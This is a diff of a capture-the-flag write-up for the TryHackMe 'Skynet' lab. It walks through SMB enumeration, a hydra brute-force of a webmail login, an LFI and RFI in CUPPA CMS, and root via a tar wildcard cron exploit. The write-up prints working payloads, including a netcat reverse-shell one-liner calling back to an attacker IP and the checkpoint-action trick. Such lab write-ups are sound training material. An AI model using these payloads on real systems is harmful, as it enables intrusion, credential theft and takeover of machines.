@@ -5,9 +5,10 @@ I rewrite this soon to be more readable lol !
 
 Password and flag are hidden.
 
+I rooted this machine in 3hours. 
+
 ## Enumeration
 First, i call my bestfriend, nmap to scan this ip:
-
 ```
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-24 06:06 EDT
 Nmap scan report for 10.10.250.118
@@ -55,15 +56,19 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 14.19 seconds
 ```
-
 We have a webserver, samba, and a POP3/IMAP server
 
 We have to enumerate theses SMB share, they have generaly some juicy files.
 
 ### SMB Enumeration
+I use smbclient to enumerate a smb server:
 ```
-┌──(kali㉿kali)-[~/Challenge/TryHackMe/Skynet]
-└─$ smbclient -L 10.10.250.118 -U Anonymous
+smbclient -L 10.10.250.118 -U " "%" "
+```
+**" "%" "** means "connect as anonymous without password".
+
+Result: 
+```
 Password for [WORKGROUP\Anonymous]:
 
         Sharename       Type      Comment
@@ -81,14 +86,15 @@ Reconnecting with SMB1 for workgroup listing.
         ---------            -------
         WORKGROUP            SKYNET
 ```
-
 We found 2 interresting folder, anonymous and milesdyson.
 
 lets continue !
 
 ```
-┌──(kali㉿kali)-[~/Challenge/TryHackMe/Skynet]
-└─$ smbclient //10.10.250.118/anonymous -U " "%" "
+smbclient //10.10.250.118/anonymous -U " "%" "
+```
+Result: 
+```
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Thu Nov 26 11:04:00 2020
@@ -109,23 +115,20 @@ smb: \logs\> dir
 
                 9204224 blocks of size 1024. 5823252 blocks available
 ```
-
 We need to get all files !
-
 ```
 mget *
 ```
+All file is empty except log1.txt
 
-log1.txt is wordlist with password. We have to bruteforce miles account.
+log1.txt is wordlist with passwords. That means on things : we have to bruteforce miles account !
 
 ### Web enum
-I use gobuster to enumerate this webserver
-
+I use gobuster to enumerate webserver
 ```
 gobuster dir -u http://10.10.250.118 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
 Here the result :
-
 ```
 ===============================================================
 Gobuster v3.6
@@ -152,20 +155,16 @@ Progress: 87664 / 87665 (100.00%)
 Finished
 ===============================================================
 ```
-
-Here the POP/IMAP server, its squirrelmail
+Here the POP/IMAP server we found previously with nmap, its squirrel mail server.
 
 ## Bruteforcing !
 
-We have an id (milesdyson) and a list of password (log1.txt)
-We can try to bruteforce the POP3/IMAP Server
+We have an id (milesdyson) and a list of passwords (log1.txt). We can try to bruteforce this webmail server.
 
-To do this, i use hashcat
-
+To do this, i use hashcat:
 ```
 hydra -l milesdyson -P /home/kali/Challenge/TryHackMe/Skynet/log1.txt 10.10.250.118 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:F=Unknown user or password incorrect." -V 
 ```
-
 Result: 
 
 ```
@@ -199,23 +198,19 @@ We are connected, we have 3 mails, 1 mail with a new password for milesdyson
 
 )s{************
 
-We can use this password in samba to get file of miles dyson.
-
-We reconnect to smb using miles dyson credentials :
-
+We can use this password in samba to get file of miles dyson. Se, we reconnect to smb using miles dyson credentials :
 
 we found a file named "important.txt" it talk about hidden page 
+
 /45kr*********
 
-This page displays a photo of miler dyson
+This page displays a photo of miler dyson.
 
 Lets try a gobuster again on this page :
 ```
 gobuster dir -u http://10.10.250.118/45kr**********/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 ```
-
 Result: 
-
 ```
 ===============================================================
 Gobuster v3.6
@@ -245,7 +240,6 @@ Its admin page of CUPPA CMS.
 After quick google, we found an LFI on this CMS, lets try to exploit it.
 
 With this payload we can see its vulnerable :
-
 ```
 http://10.10.250.118/45kr**********/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 ```
@@ -254,20 +248,15 @@ Result :
 Field configuration:
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false lxd:x:106:65534::/var/lib/lxd/:/bin/false messagebus:x:107:111::/var/run/dbus:/bin/false uuidd:x:108:112::/run/uuidd:/bin/false dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false postfix:x:113:121::/var/spool/postfix:/bin/false mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false
 ```
-
 We try other payload to get the configuration file of CUPPA CMS:
-
 ```
 http://10.10.250.118/45kr************/administrator/alerts/alertConfigField.php?urlConfig=php://filter/convert.base64-encode/resource=../Configuration.php
 ```
-
 Result :
-
 ```
 Field configuration: 
 PD9waHAgCgljbGFzcyBDb25maWd1cmF0aW9uewoJCXB1YmxpYyAkaG9zdCA9ICJsb2NhbGhvc3QiOwoJCXB1YmxpYyAkZGIgPSAiY3VwcGEiOwoJCXB1YmxpYyAkdXNlciA9ICJyb290IjsKCQlwdWJsaWMgJHBhc3N3b3JkID0gInBhc3N3b3JkMTIzIjsKCQlwdWJsaWMgJHRhYmxlX3ByZWZpeCA9ICJjdV8iOwoJCXB1YmxpYyAkYWRtaW5pc3RyYXRvcl90ZW1wbGF0ZSA9ICJkZWZhdWx0IjsKCQlwdWJsaWMgJGxpc3RfbGltaXQgPSAyNTsKCQlwdWJsaWMgJHRva2VuID0gIk9CcUlQcWxGV2YzWCI7CgkJcHVibGljICRhbGxvd2VkX2V4dGVuc2lvbnMgPSAiKi5ibXA7ICouY3N2OyAqLmRvYzsgKi5naWY7ICouaWNvOyAqLmpwZzsgKi5qcGVnOyAqLm9kZzsgKi5vZHA7ICoub2RzOyAqLm9kdDsgKi5wZGY7ICoucG5nOyAqLnBwdDsgKi5zd2Y7ICoudHh0OyAqLnhjZjsgKi54bHM7ICouZG9jeDsgKi54bHN4IjsKCQlwdWJsaWMgJHVwbG9hZF9kZWZhdWx0X3BhdGggPSAibWVkaWEvdXBsb2Fkc0ZpbGVzIjsKCQlwdWJsaWMgJG1heGltdW1fZmlsZV9zaXplID0gIjUyNDI4ODAiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luID0gMDsKCQlwdWJsaWMgJHNlY3VyZV9sb2dpbl92YWx1ZSA9ICIiOwoJCXB1YmxpYyAkc2VjdXJlX2xvZ2luX3JlZGlyZWN0ID0gIiI7Cgl9IAo/Pg==
 ```
-
 We need to decode this base64, here the result:
 ```
 <?php 
@@ -289,7 +278,6 @@ We need to decode this base64, here the result:
         } 
 ?>
 ```
-
 We can get the user flag with this LFI :
 ```
 http://10.10.250.118/45kr**************/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../home/milesdyson/user.txt
@@ -305,9 +293,7 @@ I openned et netcat listener on port 4444
 ```
 nc -lnvp 4444
 ```
-
 Then, exploit a RFI to upload a shell:
-
 ```
 http://10.10.250.118/45kr**************/administrator/alerts/alertConfigField.php?urlConfig=http://{MY_IP}/shell.php
 ```
@@ -315,40 +301,28 @@ We now have the reverse shell on the server as www-data !
 
 (Forget to copy the shell... maybe later !)
 
+I look at mysql db and dumped cu_users db, i found admin account of CUPPA, but its useless. Dont waste your time here ;).
+
 ## Privesc !
 
 I download linpeas on the server to check possible privesc
 
 He found something interesting :
-
 ```
 /home/milesdyson/backups/backup.sh
 ```
-
-Let see what it is: 
+Let see the script :
 ```
-www-data@skynet:/home/milesdyson$ cd backups
-cd backups
-www-data@skynet:/home/milesdyson/backups$ ls -la
-ls -la
-total 4584
-drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
-drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
--rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
--rw-r--r-- 1 root       root       4679680 Aug 24 07:51 backup.tgz
 www-data@skynet:/home/milesdyson/backups$ cat backup.sh
-cat backup.sh
 #!/bin/bash
 cd /var/www/html
 tar cf /home/milesdyson/backups/backup.tgz *
 ```
 As we can see, this script go on /var/www/html and use the command tar to archive everything in this folder. We can see in crontab its executed by root 
-
 ```
 */1 *   * * *   root    /home/milesdyson/backups/backup.sh
 ```
-
-we can exploit tar to get a root shell.
+We can exploit tar to get a root shell.
 Tar can use wildcards, there are “checkpoint” flags, which allow you to execute actions and commands after a specified number of files have been archived. 
 i'm gonna create a checkpoint in /var/www/html folder
 
@@ -359,15 +333,12 @@ nc -lnvp 1234
 2) Let exploit this !
 
 first, we create the checkpoint and the revshell:
-
 ```
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {MY_IP} 1234 >/tmp/f" > shell.sh
 touch -- --checkpoint=1
 touch -- "--checkpoint-action=exec=sh shell.sh"
 ```
-
 Wait until cron has executed his task, and we have root shell.
-
 ```
 listening on [any] 1234 ...
 connect to [{MY_IP}] from (UNKNOWN) [10.10.250.118] 58010
